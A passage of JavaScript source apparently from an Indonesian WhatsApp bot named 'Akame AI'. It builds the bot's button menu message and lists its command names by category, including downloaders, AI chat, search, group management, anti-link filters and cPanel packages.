sᴀʏᴀ ᴀᴅᴀʟᴀʜ *ᴀᴋᴀᴍᴇ ᴀɪ* ᴀsɪsᴛᴇɴᴛ ʏᴀɴɢ ᴅᴀᴘᴀᴛ ᴍᴇᴍʙᴀɴᴛᴜ ᴍᴜ,, ᴋᴀᴘᴀɴ ᴘᴜɴ ʏᴀ ᴋᴀᴋ 

*ᴀᴋᴀᴍᴇ ᴀɪ* ᴅᴀᴘᴀᴛ ᴍᴇᴍʙᴀɴᴛᴜ ᴀɴᴅᴀ,, ᴅᴀʟᴀᴍ ᴋᴇʙᴜᴛᴜʜᴀɴ sᴏsɪᴀʟ ᴍᴇᴅɪᴀ sᴇᴘᴇʀᴛɪ ᴍᴇɴᴀᴄʀɪ ɪɴғᴏʀᴍᴀsɪ,, ᴍᴇɴᴅᴏᴡɴʟᴏᴀᴅ ᴠɪᴅᴇᴏ ʏᴀɴɢ ʙᴇʀᴀᴅᴀ ᴅɪ sᴏsᴍᴇᴅ,, ᴀsɪsᴛᴇɴᴛ ᴀɪ ( ᴀᴋᴀᴍᴇ ᴀɪ ) ᴊɪɢᴀ ʙɪsᴀ ᴍᴇɴᴇᴍᴀɴɪ ᴀɴᴅᴀ ᴅᴀʟᴀᴍ ʙᴇʀᴍᴀɪɴ ʙᴇʀsᴀᴍᴀ 

> ┌  ◦ ᴄʀᴇᴀᴛᴏʀ : ᴋʏʏxᴅ
> └  ◦ ɴᴀᴍᴇʙᴏᴛ : ᴀᴋᴀᴍᴇ ᴀɪ
`
let buttons = [
        { buttonId: ".infoakame", buttonText: { displayText: "ɪɴғᴏʀᴍᴀsɪ" } }
    ];

    let buttonMessage = {
        image: { url: `https://img12.pixhost.to/images/1260/581261850_rulzz-official.jpg` },
	    gifPlayback: true,
        caption: menu,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363405649403674@newsletter",
                newsletterName: `INFO UPDATE`
            }
        },
        footer: "ᴄʀᴇᴀᴛᴇᴅ ʙʏ ᴋʏʏxᴅ",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'ʟɪsᴛ ᴍᴇɴᴜ' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "sʟʟᴇᴄᴛ ʙᴜᴛᴛᴏɴ",
                    sections: [
                        {
                            title: "ᴘɪʟɪʜ sᴀʟᴀʜ sᴀᴛᴜ",
                            highlight_label: "Top Feature Akame",
                            rows: [
                                { title: "All Menu", description:"Display Allmenu", id: ".allmenu" },
                                { title: "Owner", description:"Display Creator Akame", id: ".owner" }, 
                                { title: "Script", description:"Display Script Akame", id: ".sc" },
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }
    ];

    buttonMessage.buttons.push(...flowActions);

    await Kyyhst.sendMessage(m.chat, buttonMessage, { quoted: m });
};
break
case 'allmenu': case 'akame':{
if (!isRegistered) return reply(`*[ !! ]*\nᴋᴀᴍᴜ ʙᴇʟᴜᴍ ᴛᴇʀᴅᴀғᴛᴀʀ sɪʟᴀʜᴋᴀɴ ᴅᴀғᴛᴀʀ ᴅᴇɴɢᴀɴ ᴄᴀʀᴀ .ᴅᴀғᴛᴀʀ`)
Kyyhst.sendMessage(from, {react: {text: "⚡", key: m.key}})
let yy1 = "`"
let anj = `
ʜᴀʟᴏ ᴋᴀᴋ ${pushname} 👏
sᴀʏᴀ ᴀᴅᴀʟᴀʜ *ᴀᴋᴀᴍᴇ ᴀɪ* ᴀsɪsᴛᴇɴᴛ ʏᴀɴɢ ᴅᴀᴘᴀᴛ ᴍᴇᴍʙᴀɴᴛᴜ ᴍᴜ,, ᴋᴀᴘᴀɴ ᴘᴜɴ ʏᴀ ᴋᴀᴋ 

*ᴀᴋᴀᴍᴇ ᴀɪ* ᴅᴀᴘᴀᴛ ᴍᴇᴍʙᴀɴᴛᴜ ᴀɴᴅᴀ,, ᴅᴀʟᴀᴍ ᴋᴇʙᴜᴛᴜʜᴀɴ sᴏsɪᴀʟ ᴍᴇᴅɪᴀ sᴇᴘᴇʀᴛɪ ᴍᴇɴᴀᴄʀɪ ɪɴғᴏʀᴍᴀsɪ,, ᴍᴇɴᴅᴏᴡɴʟᴏᴀᴅ ᴠɪᴅᴇᴏ ʏᴀɴɢ ʙᴇʀᴀᴅᴀ ᴅɪ sᴏsᴍᴇᴅ,, ᴀsɪsᴛᴇɴᴛ ᴀɪ ( ᴀᴋᴀᴍᴇ ᴀɪ ) ᴊɪɢᴀ ʙɪsᴀ ᴍᴇɴᴇᴍᴀɴɪ ᴀɴᴅᴀ ᴅᴀʟᴀᴍ ʙᴇʀᴍᴀɪɴ ʙᴇʀsᴀᴍᴀ 

${yy1}[ I N F O - A K A M E ]${yy1}
> • ɴᴀᴍᴇʙᴏᴛ : ${global.botname}
> • ɴᴀᴍᴇᴏᴡɴᴇʀ : ${global.ownername}
> • ɴᴏᴍᴇʀ ᴄʀᴇᴀᴛᴏʀ : ${global.owner}
> • ᴠᴇʀsɪᴏɴ : ${global.version}
> • ᴘʀᴇғɪx : [ . ]
> • sᴛᴀᴛᴜ : ᴘᴜʙʟɪᴄ

${yy1}[ I N F O - D A T E ]${yy1}
> • ᴡᴀᴋᴛᴜ : ${waktuucapan}
> • ᴊᴀᴍ : ${timee}͏
͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
⏤͟͟͞͞──────────────────
${yy1}乂 [ OWNER - MENU ] 乂${yy1}
───────────────
       ─ sᴇʟғ 
       ─ ᴘᴜʙʟɪᴄ 
       ─ ɢᴇᴛᴄᴀsᴇ 
       ─ ᴀᴅᴅᴄᴀsᴇ 
       ─ ᴇᴅɪᴛᴄᴀsᴇ
       ─ ᴀᴅᴅᴘʀᴇᴍ 
       ─ ᴅᴇʟᴘʀᴇᴍ 
       ─ ᴀᴅᴅᴘʟᴜɢɪɴs 
       ─ ᴅᴇʟᴘʟᴜɢɪɴs 
       ─ ɢᴇᴛᴘʟᴜɢɪɴs 
       ─ ʟɪsᴛᴘʟᴜɢs 
       ─ sᴀᴠᴇᴘʟᴜɢɪɴs 
       ─ ʟᴇᴍᴏɴᴍᴀɪʟ
       ─ ᴊᴏɪɴ
       ─ ʟᴇᴀᴠᴇ
            
⏤͟͟͞͞──────────────────
${yy1}乂 [ DOWNLOAD - MENU ] 乂${yy1}
──────────────
       ─ ᴛɪᴋᴛᴏᴋ  ᴊɪᴋᴀ ᴇʀᴏʀ ᴘᴀᴋᴇ ʏɢ ᴋᴇ 𝟸
       ─ ᴛɪᴋᴛᴏᴋᴠ𝟸 
       ─ ᴍᴇᴅɪᴀғɪʀᴇ 
       ─ ɢɪᴛᴄʟᴏɴᴇ 
       ─ ɢᴇᴛ 
       ─ ᴘʟᴀʏ 
       ─ ᴛɪᴋᴛᴏᴋsᴇᴀʀᴄʜ
       ─ ᴛᴛ𝟹 
       ─ ɪɢᴅʟ
       ─ ʏᴛᴍᴘ𝟹
       ─ ʏᴛᴍᴘ𝟺
       ─ ᴘɪɴᴅᴏᴡɴ
       ─ ʏᴛs
              
⏤͟͟͞͞──────────────────
${yy1}乂 [ AI - MENU ] 乂${yy1}
───────────────
       ─ ᴀɪ 
       ─ ᴀɪɴsғᴡ 
       ─ ʙɪɴɢɪᴍɢ 
       ─ aiᴋᴀᴍᴇ
       ─ ʟᴜᴍɪɴᴀɪ 
       ─ ᴀᴜᴛᴏᴀɪ 
       ─ ᴋᴀᴍᴇʏᴏ 
       ─ ᴋᴀᴍᴇᴠɪᴅ 
       ─ ᴅᴇᴇᴘɪᴍɢ 
       ─ ɪsʟᴀᴍᴀɪ
       ─ ᴍᴇᴛᴀᴀɪ
       
⏤͟͟͞͞──────────────────
${yy1}乂 [ SEARCH - MENU ] 乂${yy1}
───────────────
       ─ sɢɢʟ 
       ─ ᴀɴɪᴍᴇ 
       ─ ᴍᴇᴍᴇ 
       ─ ᴘɪɴ  
       ─ ᴍᴄᴀᴅᴅᴏɴs 
       ─ ᴊᴀʟᴀɴᴛɪᴋᴜs 
       ─ ғᴀᴊᴀʀ 
       ─ ʟᴀʏᴀʀᴋᴀᴄᴀ 
       ─ sɪɴᴅᴏ 
       ─ ᴋᴏɴᴛᴀɴ 
       ─ ᴋᴏᴍᴘᴀs 
       ─ ɪɴғᴏɴᴇɢᴀʀᴀ
       ─ ɢʀᴏᴜᴘsᴇᴀʀᴄʜ
       ─ ᴠᴄᴄ
       ─ ɢᴇᴛʟɪʀɪᴋ
       
⏤͟͟͞͞──────────────────
${yy1}乂 [ CONVERT - MENU ] 乂${yy1}
───────────────
       ─ ʙʀᴀᴛ 
       ─ ʙʀᴀᴛᴠɪᴅ 
       ─ ʜɪᴛᴀᴍᴋᴀɴ 
       ─ ᴀɴɪᴍᴇʙʀᴀᴛ 
       ─ ᴛᴛs 
       ─ ᴘᴀsᴛᴇʙɪɴ
       ─ ᴛʀᴀɴsʟᴀᴛᴇ
       ─ ʜɪᴊᴀʙᴋᴀɴ
       ─ ᴘᴜᴛɪʜᴋᴀɴ

⏤͟͟͞͞──────────────────
${yy1}乂 [ STORE - MENU ] 乂${yy1}
───────────────       
       ─ ᴅᴏɴᴇ
       ─ ᴘʀᴏsᴇs
       ─ ᴅᴀɴᴀ
       ─ ɢᴏᴘᴀʏ
       ─ ᴏᴠᴏ
       ─ ǫʀɪs
       
⏤͟͟͞͞──────────────────
${yy1}乂 [ MAIN - MENU ] 乂${yy1}
───────────────
       ─ ᴛᴏᴛᴀʟғɪᴛᴜʀ 
       ─ ᴅᴀғᴛᴀʀ 
       ─ ᴏᴡɴᴇʀ 
       ─ ᴀɴɪᴍᴇ 
       ─ ᴛᴇsᴛ 
       ─ sᴄ 
       ─ ɴᴜʟɪs 
       ─ ʀᴀɴɢᴋᴜᴍʏᴛ 
       ─ ʀᴀʏᴀ 
       ─ ᴊᴋ𝟺𝟾ʟɪᴠᴇ 
       ─ ʜɪᴛᴀᴍᴋᴀɴ 
       
⏤͟͟͞͞──────────────────
${yy1}乂 [ PLUGINS - MENU ] 乂${yy1}
───────────────
       ─ ᴀᴅᴅᴘʟᴜɢɪɴs 
       ─ ᴅᴇʟᴘʟᴜɢɪɴs 
       ─ ɢᴇᴛᴘʟᴜɢɪɴs 
       ─ ʟɪsᴛᴘʟᴜɢs 
       ─ sᴀᴠᴇᴘʟᴜɢɪɴs 

⏤͟͟͞͞──────────────────
${yy1}乂 [ GROUP - MENU ] 乂${yy1}
───────────────       
       ─ ᴋɪᴄᴋ 
       ─ ʜɪᴅᴇᴛᴀɢ 
       ─ ᴛᴀɢᴀʟʟ 
       ─ ᴛᴏᴛᴀɢ 
       ─ ᴏᴘᴇɴ 
       ─ ᴏᴘᴇɴᴛɪᴍᴇ 
       ─ ᴄʟᴏꜱᴇ 
       ─ ᴄʟᴏꜱᴇᴛɪᴍᴇ 
       ─ ᴘʀᴏᴍᴏᴛᴇ 
       ─ ᴅᴇᴍᴏᴛᴇ 
       ─ ꜱᴇᴛɴᴀᴍᴇ 
       ─ ꜱᴇᴛᴅᴇꜱᴄ 
       ─ ʟɪɴᴋɢᴄ 
       ─ ʀᴇᴠᴏᴋᴇ 
       ─ ᴀɴᴛɪʟɪɴᴋɢᴄ 

⏤͟͟͞͞──────────────────
${yy1}乂 [ ANTI - MENU ] 乂${yy1}
───────────────              
       ─ ᴀɴᴛɪᴘʀᴏᴍᴏᴛɪᴏɴ        
       ─ ᴀɴᴛɪᴡᴀᴍᴇ 
       ─ ᴀɴᴛɪᴀꜱɪɴɢ 
       ─ ᴀɴᴛɪᴠɪʀᴛᴇx 
       ─ ᴀɴᴛɪʟɪɴᴋᴀʟʟ 
       ─ ᴀɴᴛɪʟɪɴᴋꜰʙ 
       ─ ᴀɴᴛɪʟɪɴᴋᴛɪᴋᴛᴏᴋ 
       ─ ᴀɴᴛɪʟɪɴᴋʏᴛ 
       ─ ᴀɴᴛɪʟɪɴᴋʏᴛᴄʜ 
       ─ ᴀɴᴛɪʟɪɴᴋɪɢ 
       ─ ᴀɴᴛɪʟɪɴᴋᴛᴇʟᴇ 
       ─ ᴀɴᴛɪᴅᴇᴡᴀsᴀ 
       ─ ᴀɴᴛɪʟɪɴᴋᴛᴡɪᴛᴛᴇʀ 
       ─ ᴀɴᴛɪʟɪɴᴋɢᴄ 
       
       
⏤͟͟͞͞──────────────────
${yy1}乂 [ CPANEL - MENU ] 乂${yy1}
───────────────      
       ─ 𝟷ɢʙ
       ─ 𝟸ɢʙ
       ─ 𝟹ɢʙ
       ─ 𝟺ɢʙ
       ─ 𝟻ɢʙ
       ─ 𝟼ɢʙ
       ─ 𝟽ɢʙ
       ─ 𝟾ɢʙ
       ─ 𝟿ɢʙ
       ─ 𝟷𝟶ɢʙ
       ─ ᴜɴʟɪ
       
⏤͟͟͞͞──────────────────
${yy1}乂 [ QUOTES - MENU ] 乂${yy1}
───────────────       
       ─ ǫᴜᴏᴛᴇsᴀɴɪᴍᴇ
       ─ ǫᴜᴏᴛᴇsʙᴀᴄᴏᴛ
       ─ ǫᴜᴏᴛᴇsʙᴜᴄɪɴ
       ─ ǫᴜᴏᴛᴇsᴍᴏᴛɪᴠᴀsɪ
       ─ ǫᴜᴏᴛᴇsɢᴀʟᴀᴜ
       ─ ǫᴜᴏᴛᴇsɢᴏᴍʙᴀʟ
       ─ ǫᴜᴏᴛᴇsʜᴀᴄᴋᴇʀ
       ─ ǫᴜᴏᴛᴇsʙɪᴊᴀᴋ

⏤͟͟͞͞──────────────────
${yy1}乂 [ ANIME - MENU ] 乂${yy1}
───────────────       
       ─ ᴀɴɪᴍᴇᴀᴡᴏᴏ 
       ─ ᴀɴɪᴍᴇᴍᴇɢᴜᴍɪɴ 
       ─ ᴀɴɪᴍᴇꜱʜɪɴᴏʙᴜ 
       ─ ᴀɴɪᴍᴇʜᴀɴᴅʜᴏʟᴅ 
       ─ ᴀɴɪᴍᴇʜɪɢʜꜰɪᴠᴇ 
       ─ ᴀɴɪᴍᴇᴄʀɪɴɢᴇ 
       ─ ᴀɴɪᴍᴇᴅᴀɴᴄᴇ 
       ─ ᴀɴɪᴍᴇʜᴀᴘᴘʏ 
       ─ ᴀɴɪᴍᴇɢʟᴏᴍᴘ 
       ─ ᴀɴɪᴍᴇꜱᴍᴜɢ 
       ─ ᴀɴɪᴍᴇʙʟᴜꜱʜ 
       ─ ᴀɴɪᴍᴇᴡᴀᴠᴇ 
       ─ ᴀɴɪᴍᴇꜱᴍɪʟᴇ 
       ─ ᴀɴɪᴍᴇᴘᴏᴋᴇ 
       ─ ᴀɴɪᴍᴇᴡɪɴᴋ  
       ─ ᴀɴɪᴍᴇʙᴏɴᴋ 
       ─ ᴀɴɪᴍᴇʙᴜʟʟʏ 
       ─ ᴀɴɪᴍᴇʏᴇᴇᴛ 
       ─ ᴀɴɪᴍᴇʙɪᴛᴇ 
       ─ ᴀɴɪᴍᴇʟɪᴄᴋ 
       ─ ᴀɴɪᴍᴇᴋɪʟʟ 
       ─ ᴀɴɪᴍᴇᴄʀʏ 
       ─ ᴀɴɪᴍᴇᴡʟᴘ 
       ─ ᴀɴɪᴍᴇᴋɪꜱꜱ 
       ─ ᴀɴɪᴍᴇʜᴜɢ 
       ─ ᴄᴏᴜᴘʟᴇᴘᴘ  
       ─ ᴀɴɪᴍᴇɴᴇᴋᴏ 
       ─ ᴀɴɪᴍᴇᴘᴀᴛ 
       ─ ᴀɴɪᴍᴇꜱʟᴀᴘ 
       ─ ᴀɴɪᴍᴇᴄᴜᴅᴅʟᴇ 
       ─ ᴀɴɪᴍᴇᴡᴀɪꜰᴜ 
       ─ ᴀɴɪᴍᴇɴᴏᴍ 
       ─ ᴀɴɪᴍᴇꜰᴏxɢɪʀʟ 
       ─ ᴀɴɪᴍᴇᴛɪᴄᴋʟᴇ  
       ─ ᴀɴɪᴍᴇɢᴇᴄɢ  
       ─ ᴅᴏɢᴡᴏᴏꜰ      
       ─ 8ʙᴀʟʟᴘᴏᴏl           
       ─ ɢᴏᴏꜱᴇʙɪʀᴅ  
       ─ ᴀɴɪᴍᴇꜰᴇᴇᴅ           
       ─ ᴀɴɪᴍᴇᴀᴠᴀᴛᴀʀ            
       ─ ʟɪᴢᴀʀᴅᴘɪᴄ            
